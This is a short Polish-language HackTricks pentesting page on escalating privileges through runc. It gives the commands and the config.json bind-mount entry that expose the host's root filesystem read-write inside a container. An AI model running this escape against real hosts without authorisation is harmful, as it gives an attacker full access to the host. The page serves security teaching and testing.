# Eskalacja uprawnień RunC

{{#include ../../banners/hacktricks-training.md}}

## Podstawowe informacje

Jeśli chcesz dowiedzieć się więcej o **runc**, sprawdź następującą stronę:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Jeśli `runc` jest dostępny dla procesu rootful na hoście, możesz użyć OCI bundle, którego konfiguracja mount rekurencyjnie bind-mountuje `/` hosta do `/` wewnątrz kontenera, ujawniając system plików hosta w tej przestrzeni nazw mount.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Udokumentowany workflow `runc run` jest rootful: własne przykłady runc określają go jako "run as root." Użytkownik nieuprzywilejowany potrzebuje konfiguracji rootless, takiej jak `runc spec --rootless`, a dokumentacja runc wskazuje, że dla tego trybu muszą być włączone user namespaces.<sup>[[1]](#references)</sup>

## References

- [1] [runc: narzędzie CLI do uruchamiania i wykonywania kontenerów](https://github.com/opencontainers/runc#using-runc)
- [2] [Specyfikacja OCI Runtime: Mounts](https://github.com/opencontainers/runtime-spec/blob/main/config.md#mounts)
- [3] [Współdzielone poddrzewa](https://docs.kernel.org/filesystems/sharedsubtree.html)
{{#include ../../banners/hacktricks-training.md}}
